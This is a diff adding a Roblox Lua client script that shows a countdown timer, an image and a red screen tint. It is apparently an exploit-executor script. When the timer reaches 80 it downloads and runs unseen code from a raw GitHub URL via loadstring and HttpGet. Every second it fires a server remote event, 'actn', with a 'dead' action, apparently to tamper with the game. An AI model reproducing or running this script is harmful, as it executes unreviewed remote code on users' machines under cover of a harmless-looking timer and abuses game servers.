@@ -1,0 +1,86 @@
+local player = game.Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Parent = player:FindFirstChild("PlayerGui")
+
+-----------------------------
+-- Create ImageLabel (Small & Top Center)
+-----------------------------
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Parent = gui
+imageLabel.Size = UDim2.new(0, 75, 0, 75) -- Much smaller size
+imageLabel.Position = UDim2.new(0.5, -90, 0, 10) -- Top center
+imageLabel.Image = "rbxassetid://123848182721193"
+imageLabel.BackgroundTransparency = 1
+imageLabel.ScaleType = Enum.ScaleType.Fit
+
+-----------------------------
+-- Create Countdown Label (Closer to Image, with gradient)
+-----------------------------
+local countdownLabel = Instance.new("TextLabel")
+countdownLabel.Parent = gui
+countdownLabel.Size = UDim2.new(0, 100, 0, 50) -- Adjusted size
+countdownLabel.Position = UDim2.new(0.5, -30, 0, 20) -- Moved closer to the image
+countdownLabel.BackgroundTransparency = 1
+countdownLabel.TextScaled = true
+countdownLabel.TextColor3 = Color3.new(1, 1, 1)
+countdownLabel.Font = Enum.Font.Arcade -- Set to arcade font
+countdownLabel.TextStrokeTransparency = 0
+countdownLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Outline for better visibility
+
+-- Apply Gradient to Text
+local gradient = Instance.new("UIGradient")
+gradient.Parent = countdownLabel
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200)), -- Lighter gray at start
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 100, 100)), -- Lighter gray in the middle (smoother transition)
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200)) -- Darker gray at the end
+})
+
+-----------------------------
+-- Red Tint Effect (initially invisible)
+-----------------------------
+local redTint = Instance.new("Frame")
+redTint.Parent = gui
+redTint.Size = UDim2.new(1, 0, 1, 0)
+redTint.BackgroundColor3 = Color3.new(1, 0, 0) -- Red color
+redTint.BackgroundTransparency = 1 -- Initially invisible (completely transparent)
+redTint.ZIndex = -1 -- Make sure the red tint stays behind everything else
+
+-----------------------------
+-- Countdown Timer
+-----------------------------
+local countdown = 210
+while countdown >= 0 do
+    countdownLabel.Text = tostring(countdown)
+    
+    if countdown == 80 then
+        -- Make screen red-tinted (start the red tint effect at 80 seconds)
+        redTint.BackgroundTransparency = 0.75 -- Make the red tint slightly visible
+        
+        -- Execute the loadstring when countdown reaches 80
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lovestacyxoxo/Escape-ring-extermination-/refs/heads/main/Ring"))()
+    end
+
+    if countdown == 0 then
+        -- Reset player (you can add other reset functionality if needed)
+        player:LoadCharacter()
+    end
+
+    -- Fire the remote event for the local player
+    local args = {
+        [1] = player.Character, -- Target the local player's character
+        [2] = "dead" -- The action to be passed
+    }
+
+    -- Ensure ReplicatedStorage and the events are valid before firing
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+    local events = replicatedStorage:WaitForChild("events")
+    local actn = events:WaitForChild("actn")
+
+    -- Fire the remote event
+    actn:FireServer(unpack(args))
+
+    countdown -= 1
+    wait(1)
+end
